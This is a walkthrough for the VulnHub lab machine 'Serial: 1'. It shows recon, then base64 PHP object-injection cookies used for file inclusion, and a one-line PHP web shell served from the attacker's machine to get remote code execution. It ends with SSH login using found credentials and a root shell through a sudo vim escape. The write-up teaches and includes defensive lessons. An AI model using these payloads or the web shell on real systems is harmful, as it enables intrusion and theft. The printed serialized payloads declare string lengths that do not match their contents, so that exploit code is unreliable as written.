# Serial: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Educational writeup.** Run this VM only on an isolated, host-only lab network.
> The goal is to understand *why* each step works, not just to copy commands.

| Field | Value |
| --- | --- |
| **Machine** | Serial: 1 |
| **Difficulty** | Easy / Medium (beginner-friendly but the web exploit needs thought) |
| **Author** | sk4 |
| **Released** | 20 August 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/serial-1,349/> |
| **Download** | <https://vulnhub.com/entry/serial-1,349/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian-based, PHP web application) |

> **Note:** this is a "hard-disk only" release — you create a new VM and attach the
> supplied disk. Exact service versions, filenames and flag strings **vary by build**,
> so treat every output below as *illustrative* and confirm against your own scan.

---

## 0. What you will learn

- How to discover a host and its open ports on a private lab network.
- How to spot a **PHP deserialization / object-injection** flaw behind a base64 cookie.
- How insecure deserialization turns into **Local File Inclusion (LFI)** and then
  **Remote File Inclusion (RFI)** → remote code execution.
- How to move from a web shell to SSH with credentials found on disk.
- How a `sudo` rule on an editor (`vim`) leads to full root access.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You need Kali running and the ability to import
an OVA/VMDK and attach it to a host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
# Find your own IP and the lab subnet (the "eth0" NIC is usually the lab adapter)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali's lab interface usually holds a `192.168.56.x`
> (VirtualBox host-only) or `192.168.19x.x` (VMware) address. The target lives on the
> **same** subnet.

```bash
# ARP-scan the subnet to list live hosts (fast: uses ARP, not a full TCP sweep)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   <-- you (Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- the target
```

**Target IP:** `192.168.56.101`

![ARP-scan finding the target](images/01-recon.png)

---

## 2. Enumeration

```bash
# 1) Fast full-TCP sweep so we never miss a non-standard port
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101

# 2) Then fingerprint the services we found
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 (Debian)
|_http-title: Serial

Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
```

> **Why it works:** `-p-` scans *every* TCP port; `-sV` fingerprints the service and
> version; `-sC` runs Nmap's safe default scripts. Two open ports means two attack
> surfaces: a web app on **80** and remote login on **22**.

![nmap service scan output](images/02-nmap.png)

### 2.1 The hint on the front page

Open `http://192.168.56.101/` in the browser. The page drops a strong hint that
something is stored in a **cookie**.

![Front page hint about cookies](images/03-web-hint.png)

### 2.2 Directory brute force

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,zip,txt
```

```text
/index.php            (Status: 200)
/backup               (Status: 301) [--> /backup/]
```

```bash
# The /backup/ directory holds source code — exactly what we need to read the logic
curl -s http://192.168.56.101/backup/backup.zip -o backup.zip
unzip backup.zip
ls
```

```text
index.php  user.class.php  log.class.php
```

> **Why it works:** developers leaving a **backup of the source code** on the web
> server is a classic finding. With the source in hand we can reason about the app
> instead of guessing.

![Downloading the backup source archive](images/04-backup-dir.png)

---

## 3. Foothold

### 3.1 Reading the source — spotting the object injection

> **Why it works:** PHP lets you convert an object into a text string with
> `serialize()` and back with `unserialize()`. If an application calls
> `unserialize()` on data the **attacker controls** (here, a cookie), the attacker can
> instantiate *any* class in the codebase — a **PHP object injection** flaw.

The vulnerable pattern looks like this (simplified from `user.class.php`):

```php
<?php
// index.php sets a cookie whose value is base64(serialize($user))
$user = unserialize(base64_decode($_COOKIE['user']));   // <-- attacker-controlled!
```

The cookie is base64, so decode it to confirm it is a serialized PHP object:

```bash
echo 'Tzo0OiJVc2VyIjoxOntzOjQ6Im5hbWUiO3M6NToiZ3Vlc3QiO30=' | base64 -d
```

```text
O:4:"User":1:{s:4:"name";s:5:"guest";}
```

> **How to read it:** `O:4:"User"` = an object of class `User`; the rest is its
> property `name = "guest"`. We fully control this string.

### 3.2 Turning the injection into file access

The `log.class.php` file contains a class that `include()`s a file whose path comes
from a property — the "gadget" we abuse:

```php
<?php
class Log {
    private $type_log = "";         // path or URL to include
    public function __construct() {
        return include($this->type_log);   // <-- arbitrary file include
    }
}
```

We build a serialized `Log` object pointing at `/etc/passwd`, base64-encode it, and
send it as the `user` cookie:

```bash
# Payload: O:3:"Log":1:{s:13:"<private>type_log";s:11:"/etc/passwd";}
PAYLOAD=$(printf 'O:3:"Log":1:{s:13:"%s";s:11:"/etc/passwd";}' 'type_log' | base64 -w0)
curl -s http://192.168.56.101/index.php -H "Cookie: user=$PAYLOAD"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
sk4:x:1001:1001::/home/sk4:/bin/bash        <-- a real login user
```

> **Why it works:** the app trusts our object, calls `include()` on the path we chose,
> and echoes the file. That is **Local File Inclusion (LFI)**.

### 3.3 From LFI to remote code execution

The same `include()` will happily fetch a **remote** URL if `allow_url_include` is on
(it is on this old build). Host a tiny PHP shell on Kali and point `type_log` at it:

```bash
# On Kali, in the directory containing shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

```bash
# Rebuild the payload so type_log points at our server
PAYLOAD=$(printf 'O:3:"Log":1:{s:13:"%s";s:28:"http://192.168.56.10/shell.php";}' 'type_log' | base64 -w0)
curl -s "http://192.168.56.101/index.php?cmd=id" -H "Cookie: user=$PAYLOAD"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** this is **Remote File Inclusion (RFI)**. The server downloads and
> *executes* our PHP, giving command execution as `www-data`.

![Remote code execution via the crafted cookie](images/05-rce.png)

### 3.4 Credentials on disk → SSH

```bash
curl -s "http://192.168.56.101/index.php?cmd=cat+/var/www/html/credentials.txt.bak" \
  -H "Cookie: user=$PAYLOAD"
```

```text
sk4 : <a-reused-password>       # (varies by build)
```

```bash
ssh sk4@192.168.56.101
cat /home/sk4/flag.txt
```

```text
<the user flag — varies by build>
```

### 3.5 The user flag recap

```bash
id
```

```text
uid=1001(sk4) gid=1001(sk4) groups=1001(sk4)
```

![Shell as sk4 and the user flag](images/06-user-flag.png)

---

## 4. Privilege escalation

Systematically check the usual vectors:

```bash
sudo -l
id
find / -perm -4000 -type f 2>/dev/null
uname -a; cat /etc/os-release
```

```text
Matching Defaults entries for sk4 on serial:
    env_reset, mail_badpass

User sk4 may run the following commands on serial:
    (root) NOPASSWD: /usr/bin/vim
```

> **Why it works:** `sk4` may run **`vim` as root without a password**. Vim isn't just
> an editor — it can shell out. Because it is launched as root, the shell it spawns is
> **root too**. This is a textbook GTFOBins abuse.

```bash
sudo vim -c ':!/bin/bash'
# ...or interactively:  sudo vim   then type   :!/bin/bash
```

```text
root@serial:/home/sk4#
```

```bash
id
cat /root/fl4g.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
<the root flag — varies by build>
```

> **Tip:** the same trick works with many editors/pagers (`vi`, `nano`, `less`,
> `more`) when they are allowed via `sudo`. See GTFOBins in the references.

![Root shell and the root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Source-code backup exposed over HTTP | `http://192.168.56.101/backup/backup.zip` | Reveals app logic/gadget classes |
| 2 | Insecure deserialization (PHP object injection) | base64 `user` cookie → `unserialize()` | Attacker instantiates arbitrary classes |
| 3 | Local File Inclusion | `Log` class `include($type_log)` | Read arbitrary files (`/etc/passwd`) |
| 4 | Remote File Inclusion | `include()` fetching an attacker URL | Remote code execution as `www-data` |
| 5 | Cleartext-ish credentials on disk | `credentials.txt.bak` in the webroot | SSH access as `sk4` |
| 6 | Dangerous `sudo` rule | `(root) NOPASSWD: /usr/bin/vim` | Full root via editor escape |

---

## 6. Defensive lessons (blue team)

- **Never leave source/backup archives in the webroot.** Deploy from version control,
  not from a `git`/zip copy. Deny access to `*.zip`, `*.bak`, `*.old` at the server.
- **Never `unserialize()` untrusted input.** Use `json_encode`/`json_decode` for data
  exchange, or `unserialize($x, ['allowed_classes' => false])` if you must.
- **Sign and validate cookies.** Prefer server-side sessions (opaque IDs) over
  client-supplied serialized objects. Consider a MAC/HMAC over any client-side data.
- **Disable `allow_url_include` and `allow_url_fopen`** in `php.ini`; scope
  `open_basedir` to the webroot. This kills RFI and narrows LFI impact.
- **Don't reuse passwords**, and never store credentials in readable files. Rotate any
  secret that touched a compromised host.
- **Audit `sudo` rules.** Granting `vim`/`less`/`find`/`tar` is equivalent to granting
  root. Use `sudoedit` for edits, or an allow-listed wrapper.
- **Detection ideas:** alert on cookies containing `O:` / `a:` (serialized PHP),
  outbound HTTP from the web server, and unexpected `www-data` process trees.

---

## 7. References

- VulnHub entry — Serial: 1: <https://vulnhub.com/entry/serial-1,349/>
- Hacking Articles — Serial: 1 Walkthrough: <https://www.hackingarticles.in/serial-1-vulnhub-walkthrough/>
- OWASP — PHP Object Injection: <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>
- OWASP — Testing for PHP Object Injection (WSTG): <https://owasp.org/www-project-web-security-testing-guide/>
- OWASP — Path Traversal / File Inclusion: <https://owasp.org/www-community/attacks/Path_Traversal>
- GTFOBins — `vim`: <https://gtfobins.github.io/gtfobins/vim/>
- PHP manual — `unserialize()`: <https://www.php.net/manual/en/function.unserialize.php>
- PortSwigger — Insecure deserialization: <https://portswigger.net/web-security/deserialization>

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port/service scan
- [ ] `images/03-web-hint.png` — the cookie hint on the front page
- [ ] `images/04-backup-dir.png` — the exposed `/backup/` source archive
- [ ] `images/05-rce.png` — remote code execution via the crafted cookie
- [ ] `images/06-user-flag.png` — shell as `sk4` and the user flag
- [ ] `images/07-privesc.png` — `sudo -l` showing the `vim` rule
- [ ] `images/08-root-flag.png` — root shell and the root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
